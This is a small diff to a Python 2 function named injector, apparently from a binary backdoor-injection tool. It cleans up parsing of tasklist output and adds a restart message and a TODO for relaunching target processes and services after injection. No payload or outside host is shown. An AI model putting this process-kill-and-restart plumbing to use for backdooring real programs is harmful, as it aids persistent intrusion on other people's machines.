@@ -1487,9 +1487,9 @@ def injector(suffix, change_Access, SHELL, encoder, host,
     all_process = os.popen("tasklist.exe")
     ap = all_process.readlines()
     all_process.close()
-    ap.pop(0)       # remove blank line
-    _ = ap.pop(0)   # remove header line
-    ap.pop(0)       # remove this ->> =======
+    ap.pop(0)   # remove blank line
+    ap.pop(0)   # remove header line
+    ap.pop(0)   # remove this ->> =======
 
     for process in ap:
         process_list.append(process.split())
@@ -1559,7 +1559,10 @@ def injector(suffix, change_Access, SHELL, encoder, host,
             print "items[1]:", list_of_targets[filename][1]
             os.system('net start %s' % list_of_targets[filename][1])
         elif items[2] is True and running_proc is True:
+            # Todo: Need to build in a process counter and only restart that
+            # number of running instances at time of process killing
             subprocess.Popen([target, ])
+            print "Restarting:", target
         else:
             print "%s was not found online not restarting" % target
 
